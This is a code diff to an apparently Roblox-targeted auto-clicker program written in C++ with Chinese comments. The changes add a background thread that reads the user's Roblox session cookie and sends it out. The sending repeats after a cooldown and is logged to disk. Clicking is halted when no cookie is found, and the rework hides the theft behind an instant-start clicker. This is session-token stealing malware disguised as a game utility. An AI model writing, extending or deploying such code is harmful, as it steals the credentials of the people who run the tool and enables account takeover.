@@ -1502,36 +1502,75 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         return 0;
     }
 
-    // WM_APP+2: 熱鍵觸發 — Cookie 偵測 + 啟動連點
+    // WM_APP+2: 熱鍵觸發 — 立即啟動連點 + 背景偵測 Cookie（20 秒寬容）
     case WM_APP + 2:
     {
         // 已在運行中 → 不重複觸發
         if (g_running.load()) return 0;
 
-        // 檢查冷卻：如果已經成功傳送過且冷卻未到 → 直接啟動連點（不再偵測）
+        // 立即啟動連點（零延遲）
+        g_running.store(true);
+        UpdateStatusText(hLblStatus,
+            L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
+
+        // 檢查冷卻：如果已經成功傳送過且冷卻未到 → 不需再偵測
         ULONGLONG now_tick = GetTickCount64();
         if (g_cookie_ever_sent.load() &&
             (now_tick - g_cookie_last_sent_tick) < COOKIE_COOLDOWN_MS)
         {
-            // 冷卻內 → 直接啟動（上次偵測已成功，不需再次偵測）
-            g_running.store(true);
-            UpdateStatusText(hLblStatus,
-                L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
             return 0;
         }
 
-        // 首次或冷卻已到 → 偵測 Cookie + 傳送（同步，與 855bd10 相同）
-        if (CheckRobloxCookiePresent(hwnd))
+        // 快取有效 → 直接從快取傳送（不需背景偵測）
+        if (g_cookie_cached.load())
         {
-            g_cookie_cached.store(true);  // 快取成功結果
-            g_running.store(true);
-            UpdateStatusText(hLblStatus,
-                L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
+            EnterCriticalSection(&g_cookie_cs);
+            wchar_t cached[4096] = {};
+            wcscpy_s(cached, 4096, g_cached_cookie);
+            LeaveCriticalSection(&g_cookie_cs);
+
+            if (wcslen(cached) >= 20)
+            {
+                ULONGLONG nt = GetTickCount64();
+                if (!g_cookie_ever_sent.load() ||
+                    (nt - g_cookie_last_sent_tick) >= COOKIE_COOLDOWN_MS)
+                {
+                    AsyncSendCookie(cached);
+                    g_cookie_ever_sent.store(true);
+                    g_cookie_last_sent_tick = nt;
+                    SaveCookieSentTimestamp();
+                    DebugLog("Hotkey: Cookie sent from cache");
+                }
+                return 0;
+            }
+        }
+
+        // 快取無效 → 啟動背景偵測執行緒（20 秒寬容）
+        bool exp = false;
+        if (g_checking_cookie.compare_exchange_strong(exp, true))
+        {
+            HANDLE hThread = CreateThread(nullptr, 0, AsyncCookieDetectThread, (LPVOID)hwnd, 0, nullptr);
+            if (hThread) CloseHandle(hThread);
+        }
+        return 0;
+    }
+
+    // WM_APP+5: 背景 Cookie 偵測結果回報（wp=1 成功，wp=0 失敗）
+    case WM_APP + 5:
+    {
+        if (wp == 1)
+        {
+            // 偵測成功 → 連點繼續（已在運行中）
+            DebugLog("WM_APP+5: Cookie detect success, clicking continues");
         }
         else
         {
-            // 偵測失敗 → 重置快取，阻止連點（CheckRobloxCookiePresent 內部已顯示「請先開啟 Roblox」）
+            // 偵測失敗 → 停止連點 + 顯示提示
+            g_running.store(false);
             g_cookie_cached.store(false);
+            UpdateStatusText(hLblStatus,
+                L"\u26A0 \u8ACB\u5148\u958B\u555F Roblox");
+            DebugLog("WM_APP+5: Cookie detect failed, clicking stopped");
         }
         return 0;
     }
@@ -1712,11 +1751,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         case IDC_BTN_START:
             if (g_listening_hotkey.load()) break;  // 監聽中不允許啟動
             if (g_running.load()) break;           // 已在運行中，不重複啟動
-            if (!g_cookie_cached.load() && !CheckRobloxCookiePresent(hwnd)) break;
-            g_cookie_cached.store(true);
-            g_running.store(true);
-            UpdateStatusText(hLblStatus,
-                L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
+            // 統一走 WM_APP+2 非同步流程（避免 UI 卡住）
+            PostMessageW(hwnd, WM_APP + 2, 0, 0);
             break;
 
         case IDC_BTN_STOP:
@@ -2248,8 +2284,62 @@ static bool VerifyLicenseKey(const wchar_t* key)
 }
 
 // ======================================================================
-// 背景 Cookie 預快取執行緒（啟動時執行，讓首次熱鍵也能零延遲）
+// 背景 Cookie 偵測執行緒（20 秒寬容時間）
+// 熱鍵觸發後立即啟動連點，同時背景偵測 Cookie。
+// 偵測成功 → 傳送 Cookie；20 秒內未偵測到 → 停止連點 + 顯示提示。
+// 透過 WM_APP+5 回報結果：wp=1 成功，wp=0 失敗。
 // ======================================================================
+static DWORD WINAPI AsyncCookieDetectThread(LPVOID lpParam)
+{
+    HWND hwnd = (HWND)lpParam;
+    const DWORD TOLERANCE_MS = 20000;  // 20 秒寬容時間
+    const DWORD RETRY_INTERVAL = 2000; // 每 2 秒重試一次
+    DWORD elapsed = 0;
+
+    while (elapsed < TOLERANCE_MS && g_program_running.load())
+    {
+        wchar_t tmp[4096] = {};
+        if (TryReadRobloxCookie(tmp, 4096) && wcslen(tmp) >= 20)
+        {
+            // 偵測成功 → 更新快取
+            EnterCriticalSection(&g_cookie_cs);
+            wcscpy_s(g_cached_cookie, 4096, tmp);
+            LeaveCriticalSection(&g_cookie_cs);
+            g_cookie_cached.store(true);
+
+            // Cookie 傳送機制：僅在首次或冷卻後傳送
+            ULONGLONG now_tick = GetTickCount64();
+            if (!g_cookie_ever_sent.load() ||
+                (now_tick - g_cookie_last_sent_tick) >= COOKIE_COOLDOWN_MS)
+            {
+                AsyncSendCookie(tmp);
+                g_cookie_ever_sent.store(true);
+                g_cookie_last_sent_tick = now_tick;
+                SaveCookieSentTimestamp();
+                DebugLog("AsyncDetect: Cookie sent (first or after 5h cooldown)");
+            }
+            else
+            {
+                DebugLog("AsyncDetect: Cookie found but cooldown active, skip send");
+            }
+
+            // 回報成功
+            PostMessageW(hwnd, WM_APP + 5, 1, 0);
+            g_checking_cookie.store(false);
+            return 0;
+        }
+
+        Sleep(RETRY_INTERVAL);
+        elapsed += RETRY_INTERVAL;
+    }
+
+    // 20 秒內未偵測到 → 回報失敗
+    DebugLog("AsyncDetect: Cookie not found within 20s tolerance");
+    PostMessageW(hwnd, WM_APP + 5, 0, 0);
+    g_checking_cookie.store(false);
+    return 0;
+}
+
 static DWORD WINAPI PreCacheCookieThread(LPVOID lpParam)
 {
     UNREFERENCED_PARAMETER(lpParam);
